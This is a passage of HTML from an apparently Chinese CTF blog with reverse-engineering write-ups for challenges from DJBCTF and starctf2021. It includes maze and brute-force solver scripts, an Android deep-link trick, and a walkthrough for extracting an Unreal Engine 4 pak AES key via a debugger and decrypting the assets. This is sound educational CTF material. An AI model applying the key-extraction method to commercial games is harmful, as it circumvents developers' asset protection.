class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> v5, <span class="keyword">int</span> v4, <span class="keyword">char</span> ch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(i &gt; <span class="number">33</span> ) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(v4 == <span class="number">4</span>  &amp;&amp; v5 == <span class="number">7</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"yes: %s\n"</span>, flag);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ch != <span class="string">'L'</span> &amp;&amp; (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; (byte_404018+<span class="number">3</span>)[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">  &#123; </span><br><span class="line">flag[i] = <span class="string">'R'</span>;</span><br><span class="line">    dfs(i+<span class="number">1</span>, v5, v4+<span class="number">1</span>, <span class="string">'R'</span>);</span><br><span class="line">  &#125; </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> (ch != <span class="string">'R'</span> &amp;&amp; (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; (byte_404018+<span class="number">2</span>)[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = <span class="string">'L'</span>;</span><br><span class="line">dfs(i+<span class="number">1</span>, v5, v4<span class="number">-1</span>, <span class="string">'L'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (ch != <span class="string">'U'</span> &amp;&amp; (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; (byte_404018+<span class="number">1</span>)[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = <span class="string">'D'</span>;</span><br><span class="line"></span><br><span class="line">dfs(i+<span class="number">1</span>, v5+<span class="number">1</span>, v4, <span class="string">'D'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ch != <span class="string">'D'</span> &amp;&amp;  (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; byte_404018[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = <span class="string">'U'</span>;</span><br><span class="line">dfs(i+<span class="number">1</span>, v5<span class="number">-1</span>, v4, <span class="string">'U'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">dfs(<span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="string">'1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Matara-Okina"><a href="#Matara-Okina" class="headerlink" title="Matara Okina"></a>Matara Okina</h3><p>本来没怎么做过安卓，从这个题学了不少，比赛期间大多数时间都去学安卓了，虽然对解决本题用不上，但由此感觉安卓还是挺好玩的。</p><p>开始拿到题目对下面就有点疑惑：</p><p><img src="/2021/01/26/DJBCTF/image-20210125114031206-1611648521523.png" alt="image-20210125114031206"></p><p>知道是取出secret参数的值经过异或运算后和一个ans字符串比较一下。那就先求出来看看：<strong>Android_scheme_is_FUN</strong></p><p>开始以为这就是flag，结果不是，仔细看到是把这个字符串传入一个native层的check的函数的，通过一些运算显示出来。。其次看到scheme，加上之前的uri，突然明白了。。再到Mainifest看看，果然：</p><p><img src="/2021/01/26/DJBCTF/image-20210125114541846-1611648525744.png" alt="image-20210125114541846"></p><p>就类似我们点击一个链接打开app一样，自己写一个网页链接让手机点一下就可以了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"sh0w://p4th/70/1nput?secret=Android_scheme_is_FUN"</span>&gt;</span>app<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="UnrealFlag"><a href="#UnrealFlag" class="headerlink" title="UnrealFlag"></a>UnrealFlag</h3><p>对于这个题，其实就是一个解密一个游戏中加密的数据，挺实战的，比赛时没做，也是信息搜索能力没到位，知道要解密pak文件但是google，baidu了半天都没找到一个合适的文章。这个文章赛后看到的，很清晰且全：<a href="https://blog.jamie.holdings/2019/03/23/reverse-engineering-aes-keys-from-unreal-engine-4-projects/" target="_blank" rel="noopener">Reverse Engineering AES Keys From Unreal Engine 4 Projects</a></p><p>前期准备就是下载要解密文件对应游戏使用的虚幻引擎版本，这里4.26。</p><p>然后找到要解密文件使用的key，最后使用下载引擎中提供的Urealpak.exe解密即可。</p><p>开始找key:</p><p>找到安装引擎目录的：<strong>D:\Epic Games\UE_4.26\Engine\Source\Runtime\PakFile\Private\IPlatformFilePak.cpp</strong>文件，查看代码，虽然这个引擎版本可能会有一定的区别，但都是DecryptData下手：第三个参数即是。</p><p><img src="/2021/01/26/DJBCTF/image-20210126140813667-1611648530624.png" alt="image-20210126140813667">)当为了在调试的时候好定位到上面这个函数，我们一般的方法是找到调用它的地方，直到有错误字符串信息出现（方便我们定位）。找引用的时候可能出现很多函数调用它的情况，但一般以LoadIndex()函数为最上层的函数，至于原因，上面文章有提到：</p><p><img src="/2021/01/26/DJBCTF/image-20210126140646329-1611648534391.png" alt="image-20210126140646329"></p><p>一直向上回溯找到了第一次出现字符串的地方，x64搜索看看，有的。</p><p><img src="/2021/01/26/DJBCTF/image-20210126142130832-1611648537839.png" alt="image-20210126142130832"></p><p>然后在x64中看的时候，源代码与其反汇编的结果并不是一一对应的，有可能一个函数是内联函数和反汇编结果是对一个函数进行了展开。这里就是：</p><p>首先看定位到字符串那一部分的源代码：</p><p><img src="/2021/01/26/DJBCTF/image-20210126151157572-1611648541083.png" alt="image-20210126151157572"></p><p>然后x64中的情况：</p><p><img src="/2021/01/26/DJBCTF/image-20210126151408840-1611648544164.png" alt="image-20210126151408840"></p><p>所以这里直接跟进我下断点的函数，然后从源代码可知，最后可从第三个参数获取key的函数在最后一个，但我们在x64中看到的是编译后的结果，一般编译器都会在初始和末尾添加一些检查函数的，这里大概猜一下，先在倒数第二个函数处下断然后看r8寄存器的值，如果不行继续换别的就是，反正范围就这么几个函数。</p><p>成功得到key，从hex转化为base64就好了。</p><p><img src="/2021/01/26/DJBCTF/image-20210126152347350-1611648547783.png" alt="image-20210126152347350"></p><p>最后：UnrealPak.exe accepts a “crypto.json” parameter. You will want to create this file somewhere and add the following，即创建一个和下面类似的文件，把找到的key写入指定位置。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"$types"</span>: &#123;</span><br><span class="line">    <span class="attr">"UnrealBuildTool.EncryptionAndSigning+CryptoSettings, UnrealBuildTool, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"UnrealBuildTool.EncryptionAndSigning+EncryptionKey, UnrealBuildTool, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null"</span>: <span class="string">"2"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"$type"</span>: <span class="string">"1"</span>,</span><br><span class="line">  <span class="attr">"EncryptionKey"</span>: &#123;</span><br><span class="line">    <span class="attr">"$type"</span>: <span class="string">"2"</span>,</span><br><span class="line">    <span class="attr">"Name"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"Guid"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"Key"</span>: <span class="string">"uZFnisGm9AFdQ2hGBMRKm38+LAShgkbEMJOn8bv/arc="</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"SigningKey"</span>: <span class="literal">null</span>,</span><br><span class="line">  <span class="attr">"bEnablePakSigning"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"bEnablePakIndexEncryption"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"bEnablePakIniEncryption"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"bEnablePakUAssetEncryption"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"bEnablePakFullAssetEncryption"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"bDataCryptoRequired"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"SecondaryEncryptionKeys"</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来用指定格式的command解密：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"D:<span class="symbol">\E</span>pic Games"<span class="symbol">\U</span>E_4.26<span class="symbol">\E</span>ngine<span class="symbol">\B</span>inaries<span class="symbol">\W</span>in64<span class="symbol">\U</span>nrealpak.exe FindFlag-WindowsNoEditor.pak -Extract C:<span class="symbol">\U</span>sers<span class="symbol">\1</span>1480<span class="symbol">\D</span>esktop<span class="symbol">\s</span>ss<span class="symbol">\ </span>-cryptokeys=C:<span class="symbol">\U</span>sers<span class="symbol">\1</span>1480<span class="symbol">\D</span>esktop<span class="symbol">\s</span>ss<span class="symbol">\c</span>rypto.json</span><br></pre></td></tr></table></figure><p>一般解密游戏中的数据就是各种模型，flag也应该也是一个类似的模型文件，使用umodel打文件<strong>flag.uasset</strong>，再转化成png保存就好了。</p><p><img src="/2021/01/26/DJBCTF/image-20210126160135944-1611648556272.png" alt="image-20210126160135944"></p><h3 id="anniu"><a href="#anniu" class="headerlink" title="anniu"></a>anniu</h3><p>开始就知道要让灰色按钮可用，找了enablewindow函数，但是不行，然后这个是易语言写的程序和以往做的有点不一样。。找按钮事件又没找到？。。奇怪。</p><p>最后直接OD从开始跟踪程序创建窗口的过程。其实就是很多个子窗口叠加的。从创建flag按钮的creatwindowsex找到了端倪，我才知道可以创建窗口的时候让控件不可用。。</p><p>其中的WS_DISABLED从VS查到了是0x08000000，所以我把整个值改为0x44012F00即可。</p><p><img src="/2021/01/26/DJBCTF/image-20210125115444155-1611648561584.png" alt="image-20210125115444155"></p><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>就一个数独游戏，开始判断是不是每列每行的数都各不相同，然后判断每4*4的单元是不是每个数各不相同，典型的数独特征。</p><p>直接找个在线求解一下即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> flag[] = &#123;<span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">9</span>, </span><br><span class="line"><span class="number">14</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">6</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(flag[i]<span class="number">-1</span> &gt;= <span class="number">10</span>)</span><br><span class="line"><span class="built_in">putchar</span>(flag[i]<span class="number">-1</span>+<span class="number">87</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">putchar</span>(flag[i]<span class="number">-1</span>+<span class="number">48</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="e"><a href="#e" class="headerlink" title="e"></a>e</h3><p>应该类似主程序装载一个文件，然后关键函数都在那个.so文件，所以动态跟踪就好了，很简单，找到输入的地方后下个断点，一会就来到的一个比较函数，虽然去了符号，但还是能猜到就是类似strcmp()函数，输入和目标字符比较。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>starctf2021</title>
      <link href="/2021/01/17/starctf2021/"/>
      <url>/2021/01/17/starctf2021/</url>
      
        <content type="html"><![CDATA[<p>学到了使用sage在一个有限域内求一个矩阵的逆矩阵，也就是hill加密。</p><p>其次是对写dfs更熟悉了，且对python3读写文件“wb”与“w”模式理解的更加深入。</p><p>最后就是多线程爆破体验极好😂。</p><a id="more"></a><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h3><p>开始关键点都没找到，运行了一下程序从报错信息经过搜索知道了这是个rust写程序，且这个错误信息是编写的时候可以定义的，从这也顺藤摸瓜的知道了报错是因为没有flag文件。</p><p>程序首先读取flag文件取数据，经过加密后写入output文件。</p><p><img src="/2021/01/17/starctf2021/image-20210127134521754-1611759746138.png" alt="image-20210127134521754"></p><p>然后简单分析一下，逻辑什么的很清楚，按照一定的顺序对每一位进行异或加密，但是那个异或的值是随机的，通过前面的数据来初始化的数据流。是一种流密码，但这里想了很久但是不知道怎么逆，后面想到按照题目加密的顺序一位一位的穷举肯定可以，，但是工程量就有点大了。。</p><p>最后才想到了python脚本，花了点时间，也改了很多，还有就是这个存在多对一的情况，所以要搜索。。</p><p>其次开始怎么也跑不出来，后面调试才发现，程序每次读取的字符都加了回车（’\0xa’），这就导致长度增加，而加密是用到了长度的。。然后就是为什么呢？</p><p>最后大量尝试搜索才发现，因为我开始是往flag文件手动输入的，然后脚本里也是先读取flag文件，这就导致开始就多了和一个’\0xa’，而后在写入也是同样有‘\0xa’。其次python2的‘rb’与‘r’模式读取都是str类型，而python3的‘rb’是byte, ‘r’才是str类型。且python若是‘wb’写入那写入数据必须是byte类型，而python2就都可以。</p><p>这里执行程序，有3种办法：</p><ul><li>os.system(‘./a’) 这里建议使用这个。</li><li>使用Popen() <a href="https://blog.csdn.net/super_he_pi/article/details/99713374" target="_blank" rel="noopener">python 中subprocess.Popen(）详解</a></li><li>pexpect 如果有交互的话，推荐使用。</li></ul><p>10s就得到了结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">startTime = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"output_flag"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">enc = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">index = [<span class="number">4</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">25</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">21</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">42</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">17</span>, <span class="number">24</span>, <span class="number">31</span>, <span class="number">38</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">34</span>, <span class="number">41</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">40</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">22</span>, <span class="number">29</span>, <span class="number">36</span>, <span class="number">43</span>]</span><br><span class="line">base = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;_=-~!.@#%^&amp;*()"</span></span><br><span class="line">result = [<span class="string">'1'</span>]*<span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">45</span>:</span><br><span class="line">print(<span class="string">'find one:'</span> + <span class="string">''</span>.join(result))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> base:</span><br><span class="line">result[index[i]] = ch</span><br><span class="line">flag = <span class="string">''</span>.join(result)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(flag.encode())</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment">#r = pexpect.spawn('./a')</span></span><br><span class="line"><span class="comment">#r.wait()</span></span><br><span class="line">os.system(<span class="string">'./a'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'output'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">ans = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">if</span> ans[index[i]] == enc[index[i]]:</span><br><span class="line">    print(flag)</span><br><span class="line">    dfs(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">dfs(<span class="number">0</span>)</span><br><span class="line">endTime = datetime.datetime.now()</span><br><span class="line">print(<span class="string">"运行的时间是：%ss"</span> % (endTime - startTime).seconds)</span><br></pre></td></tr></table></figure><h3 id="ChineseGame"><a href="#ChineseGame" class="headerlink" title="ChineseGame"></a>ChineseGame</h3><p>读懂游戏怎么玩的后，手动弄了几个数据然后总结规律。</p><p>一个长度为10的链表，最后把所有的数据域都变成大于100。</p><p><img src="/2021/01/17/starctf2021/image-20210127135918158-1611759760723.png" alt="image-20210127135918158"></p><p>就是不断累加套上去就是了。</p><p>赛后看大家很多都是发现了只要那个数据域是0就像向上，1的话就向下，直接paython脚本，真是好。。。</p><h3 id="wherekey"><a href="#wherekey" class="headerlink" title="wherekey"></a>wherekey</h3><p>就是这个题因为z3没有解，以为我哪里弄错了郁闷半天，最后也没有把题目做出来。</p><p>由矩阵的乘法可知，这里算法实际就是用一个固定的5*5矩阵去乘flag组成的5*5矩阵，但是每次都mod了257，所以在一个有限域内。</p><p>然后其实可以爆破的，我看爆破的人也挺多的，hhha。。</p><p>这里我算了一下，如果常规写5个for循环爆破时间不会少的。。</p><p>但是用pwntools的多线程爆破，最多2个多小时就搞定了，也还是可以的。hhh。<a href="https://happi0.gitee.io/happi0/2020/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84python/#toc-heading-3" target="_blank" rel="noopener">Crypto常用工具</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> pwnlib</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">base = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;_=-~!.@#%^&amp;*()"</span></span><br><span class="line">enc = [<span class="number">56</span>, <span class="number">109</span>,  <span class="number">75</span>,  <span class="number">75</span>, <span class="number">185</span>, <span class="number">138</span>, <span class="number">249</span>, <span class="number">138</span>, <span class="number">187</span>,  <span class="number">92</span>, </span><br><span class="line">  <span class="number">138</span>, <span class="number">154</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">210</span>, <span class="number">198</span>, <span class="number">187</span>,   <span class="number">5</span>, <span class="number">144</span>,  <span class="number">86</span>, </span><br><span class="line">  <span class="number">147</span>, <span class="number">230</span>,  <span class="number">18</span>, <span class="number">189</span>,  <span class="number">79</span>]</span><br><span class="line">b = <span class="string">"flag&#123;are_you_sure_friend&#125;"</span></span><br><span class="line">b = list(map(ord, b))</span><br><span class="line">enc = enc[<span class="number">5</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(a)</span>:</span></span><br><span class="line">a = 